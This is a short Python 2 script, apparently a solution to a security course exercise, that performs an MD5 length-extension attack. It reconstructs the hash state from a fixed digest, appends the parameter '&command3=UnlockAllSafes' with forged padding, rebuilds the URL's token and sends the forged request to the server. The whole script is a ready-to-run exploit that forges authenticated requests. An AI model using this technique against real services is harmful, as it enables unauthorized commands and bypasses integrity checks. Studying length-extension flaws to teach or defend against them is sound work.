from pymd5 import md5, padding
import httplib, urlparse, sys
import urllib

url = sys.argv[1]

tokenLoc = url.find("token=") + 6
endLoc = url.find("&user=")
msgLoc = endLoc + 1

m_hash = "password" + url[msgLoc:]
m_len = len(m_hash)

m_bits = (m_len + len(padding(m_len * 8)))* 8

h = md5(state="402a574d265dc212ee64970f159575d0".decode("hex"), count=m_bits)

x = "&command3=UnlockAllSafes"
h.update(x)

x_padding = urllib.quote(padding(m_len*8))

padded_msg = url[msgLoc:] + x_padding + x

updatedURL = url[:tokenLoc] + h.hexdigest() + "&" + padded_msg

print updatedURL

parsedUrl = urlparse.urlparse(updatedURL)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
